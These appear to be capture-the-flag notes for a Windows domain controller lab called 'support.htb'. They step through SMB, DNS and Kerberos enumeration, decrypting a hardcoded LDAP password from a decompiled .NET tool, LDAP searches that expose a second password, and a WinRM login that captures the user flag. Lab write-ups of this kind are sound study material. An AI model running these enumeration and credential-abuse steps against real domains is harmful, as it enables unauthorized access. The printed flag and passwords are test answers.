From nmap scan: `Domain: support.htb0.`
# SMB

```bash
smbclient -N -L \\\\10.129.3.239\\                                                                                                                                
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IPC$            IPC       Remote IPC
# NETLOGON        Disk      Logon server share 
# support-tools   Disk      support staff tools
# SYSVOL          Disk      Logon server shar
```

```bash
smbclient -N \\\\10.129.3.239\\SYSVOL

# smb: \> ls
# NT_STATUS_ACCESS_DENIED listing \*
```
SYSVOL and NETLOGON `ls` => `NT_STATUS_ACCESS_DENIED listing \*`

Share "support-tools" has a bunch of executables + version:
![[Pasted image 20251204212435.png]]

# DNS

```bash
dig any support.htb @10.129.3.239

# ;; ANSWER SECTION:
# support.htb.            600     IN      A       10.129.3.239
# support.htb.            3600    IN      NS      dc.support.htb.
# support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 121 900 600 86400 3600

# ;; ADDITIONAL SECTION:
# dc.support.htb.         3600    IN      A       10.129.3.239
```
=> Add `dc.support.htb` to /etc/hosts

# User Enum

```bash
~/Hacking/tools/kerbrute_linux_386 userenum --dc dc.support.htb -d support.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

# 2025/12/04 21:37:13 >  [+] VALID USERNAME:       support@support.htb
# 2025/12/04 21:37:13 >  [+] VALID USERNAME:       guest@support.htb
# 2025/12/04 21:37:16 >  [+] VALID USERNAME:       administrator@support.htb
```

# VS code - ILSpy extension

The file `UserInfo.exe.zip` is a non-default exe.

Upon downloading and inspecting it via file it turns out its a .Net binary:
```bash
file UserInfo.exe
# UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

We can use the VScode extension ILSPy to decompile it.
The program has some hardcoded credentials to make LDAP queries.

Decryption function:
`UserInfo.Services` ->  `Protected` -> `getPassword()`:
```c#
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
	}
	return Encoding.Default.GetString(array2);
}
```

Encrypted password and key:
`UserInfo.Services` ->  `Protected` -> `Protected()`:
```c#
static Protected()
{
	enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
	key = Encoding.ASCII.GetBytes("armando");
}
```

The username used for the LDAP query is `ldap`:
`UserInfo.Services` ->  `LdapQuery` -> `LdapQuery()`:
```c#
public LdapQuery()
{
	string password = Protected.getPassword();
	entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	entry.AuthenticationType = (AuthenticationTypes)1;
	ds = new DirectorySearcher(entry);
}
```

# Decrypt password

Python script `decrypt.py`:
```python
import base64

def decrypt_password(enc_b64, key_str):
    # Base64 Decode the encrypted string
    try:
        cipher_bytes = base64.b64decode(enc_b64)
    except Exception:
        return "Error in Base64 decoding."

    # Encode the key (armando)
    key_bytes = key_str.encode('ascii')
    key_len = len(key_bytes)
    
    # XOR Constant 0xDF (223)
    xor_constant = 0xDF
    
    decrypted_bytes = bytearray()

    # Perform the full XOR decryption loop
    for i in range(len(cipher_bytes)):
        # Calculate the three components of the XOR
        c_byte = cipher_bytes[i]
        k_byte = key_bytes[i % key_len]
        
        # P_i = C_i ^ K_i ^ 0xDF
        p_byte = c_byte ^ k_byte ^ xor_constant
        
        decrypted_bytes.append(p_byte)

    # Use 'latin-1' to convert bytes to string, preventing UnicodeDecodeError
    # (The resulting plaintext should be pure ASCII/printable.)
    return decrypted_bytes.decode('utf-8')

# --- Input Variables ---
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key_value = "armando"

# --- Execution ---
decrypted_password = decrypt_password(enc_password, key_value)

print("-" * 50)
print(f"Encrypted Password (B64): {enc_password}")
print(f"Key: {key_value}")
print(f"Decrypted Password: {decrypted_password}")
print("-" * 50)
```
=> Decrypted pw: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

# AD user enum

```bash
impacket-samrdump 'ldap':'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'@dc.support.htb
```

Results:
```
[*] Looking up users in domain SUPPORT
Found user: Administrator, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: ldap, uid = 1104
Found user: support, uid = 1105
Found user: smith.rosario, uid = 1106
Found user: hernandez.stanley, uid = 1107
Found user: wilson.shelby, uid = 1108
Found user: anderson.damian, uid = 1109
Found user: thomas.raphael, uid = 1110
Found user: levine.leopoldo, uid = 1111
Found user: raven.clifton, uid = 1112
Found user: bardot.mary, uid = 1113
Found user: cromwell.gerard, uid = 1114
Found user: monroe.david, uid = 1115
Found user: west.laura, uid = 1116
Found user: langley.lucy, uid = 1117
Found user: daughtler.mabel, uid = 1118
Found user: stoll.rachelle, uid = 1119
Found user: ford.victoria, uid = 1120
```

# AS-REP Roasting

```bash
impacket-GetNPUsers -dc-ip 10.129.230.181 'support.htb/ldap':'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
# No entries found!
```

# Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.230.181 'support.htb/ldap':'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
# No entries found!
```

# ApacheDirectoryStudio

Using ApacheDirectoryStudio and viewing the user "support", looks like there is a password in the "info" field:
![[Pasted image 20251205130702.png]]

# Ldapsearch

As alternative to ApacheDirectoryStudio we could also use ldapsearch to find the password:
```bash
ldapsearch -H ldap://dc.support.htb -D 'CN=ldap,CN=users,DC=support,DC=htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" '(&(objectClass=user)(sAMAccountName=support))' '*'

ldapsearch -H ldap://dc.support.htb -D 'CN=ldap,CN=users,DC=support,DC=htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" '(&(objectClass=user)(sAMAccountName=support))' info
# support, Users, support.htb
# dn: CN=support,CN=Users,DC=support,DC=htb
# info: Ironside47pleasure40Watchful
```

# Evil-winrm as support

```bash
evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
```
BINGO!!!

Flag:
```powershell
C:\Users\support> cat Desktop\user.txt
# 38645ad427b936dc017c74eceeed4a51
```
